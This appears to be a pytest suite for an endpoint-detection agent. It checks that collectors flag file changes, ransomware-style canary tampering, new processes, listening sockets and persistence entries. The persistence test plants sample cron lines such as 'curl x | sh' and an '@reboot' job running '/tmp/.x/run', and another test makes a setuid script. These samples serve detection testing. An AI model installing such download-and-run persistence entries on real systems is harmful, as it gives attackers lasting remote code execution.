import os
import subprocess
import time

from xdr.collectors import files as files_mod
from xdr.collectors import persistence as pers_mod
from xdr.collectors.files import FileIntegrityCollector, RansomwareCollector
from xdr.collectors.network import NetworkCollector
from xdr.collectors.persistence import PersistenceCollector
from xdr.collectors.process import ProcessCollector
from xdr.collectors.system import AccountCollector, KernelCollector
from xdr.storage import Storage


def actions(events):
    return {(e.action, os.path.basename(e.data.get("path", ""))) for e in events}


def test_fim_detects_changes(tmp_path):
    root = tmp_path / "etc"
    root.mkdir()
    (root / "a.conf").write_text("x=1")
    (root / "b.conf").write_text("y=1")
    st = Storage(":memory:")
    c = FileIntegrityCollector({"paths": [str(root)]}, st, lambda e: None)
    c.setup()
    assert c.collect() == []  # línea base silenciosa
    time.sleep(0.01)
    (root / "a.conf").write_text("x=2 modificado")
    (root / "new.sh").write_text("#!/bin/sh\necho hi")
    os.rename(root / "b.conf", root / "b.conf.bak")
    os.chmod(root / "new.sh", 0o4755)
    evs = c.collect()
    got = actions(evs)
    assert ("modify", "a.conf") in got
    assert ("create", "new.sh") in got
    assert ("rename", "b.conf.bak") in got
    new = next(e for e in evs if e.data.get("filename") == "new.sh")
    assert new.data["setuid"] and new.data["is_script"] and new.data["sha256"]
    (root / "a.conf").unlink()
    assert ("delete", "a.conf") in actions(c.collect())
    # la línea base persiste entre reinicios
    c2 = FileIntegrityCollector({"paths": [str(root)]}, st, lambda e: None)
    c2.setup()
    assert c2.collect() == []


def test_ransomware_canary(tmp_path, monkeypatch):
    home = tmp_path / "home" / "alice"
    home.mkdir(parents=True)
    monkeypatch.setattr(files_mod, "home_dirs", lambda: [str(home)])
    c = RansomwareCollector({"paths": [str(tmp_path / "home")], "canaries": True}, Storage(":memory:"),
                            lambda e: None)
    c.setup()
    c.collect()
    assert c.canaries
    canary = next(iter(c.canaries))
    with open(canary, "wb") as fh:
        fh.write(os.urandom(1000))
    evs = c.collect()
    assert any(e.action == "canary_tampered" for e in evs)
    (home / "doc.txt").write_bytes(os.urandom(5000))
    evs = c.collect()
    doc = next(e for e in evs if e.data.get("filename") == "doc.txt")
    assert doc.data["entropy"] > 7


def test_persistence_collector(tmp_path, monkeypatch):
    cron = tmp_path / "cron.d"
    cron.mkdir()
    (cron / "job").write_text("* * * * * root /usr/bin/true\n")
    monkeypatch.setattr(pers_mod, "SYSTEM_LOCATIONS", [("cron", str(cron / "*"))])
    monkeypatch.setattr(pers_mod, "home_dirs", lambda: [])
    c = PersistenceCollector({}, Storage(":memory:"), lambda e: None)
    c.setup()
    first = c.collect()
    assert first[0].action == "existing" and first[0].data["initial"]
    (cron / "job").write_text("* * * * * root /usr/bin/true\n* * * * * root curl x | sh\n")
    (cron / "evil").write_text("@reboot root /tmp/.x/run\n")
    evs = {e.action: e for e in c.collect()}
    assert evs["modified"].data["added_lines"] == "* * * * * root curl x | sh"
    assert evs["created"].data["mechanism"] == "cron"


def test_process_collector_sees_new_process():
    c = ProcessCollector({"realtime": False, "ignore_own_children": False}, Storage(":memory:"), lambda e: None)
    c.setup()
    c.collect()
    p = subprocess.Popen(["sleep", "5"])
    try:
        time.sleep(0.2)
        evs = c.collect()
        mine = [e for e in evs if e.action == "start" and e.data["pid"] == p.pid]
        assert mine and mine[0].data["name"] == "sleep" and mine[0].data["exe_hash"]
        assert mine[0].data["parent"]["pid"] == os.getpid()
    finally:
        p.kill()


def test_network_collector_listen():
    import socket
    c = NetworkCollector({}, Storage(":memory:"), lambda e: None)
    c.setup()
    c.collect()
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    s.listen()
    try:
        evs = c.collect()
        port = s.getsockname()[1]
        assert any(e.action == "listen" and e.data["local_port"] == port for e in evs)
        assert any(e.category == "metric" for e in evs)
    finally:
        s.close()


def test_account_and_kernel_collectors_run():
    st = Storage(":memory:")
    a = AccountCollector({}, st, lambda e: None)
    a.setup()
    a.collect()
    assert st.baseline_exists("accounts")
    k = KernelCollector({}, st, lambda e: None)
    if k.supported():
        k.setup()
        k.collect()
        assert k.hidden_processes() == []
